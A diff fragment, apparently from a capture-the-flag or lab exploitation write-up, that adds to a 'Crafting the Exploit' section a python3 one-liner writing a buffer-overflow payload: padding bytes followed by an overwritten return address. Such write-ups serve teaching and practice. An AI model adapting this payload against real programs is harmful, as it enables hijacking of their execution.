@@ -21,3 +21,5 @@ We used cyclic_find to translate that value back into a numeric offset
 ## Crafting the Exploit
 Once we had the offset and the necessary addresses, we could build the final payload.
 
+python3 -c "import sys; sys.stdout.buffer.write(b'A'*63 + b'B'*9 + b'\x96\x11\x40')"
+
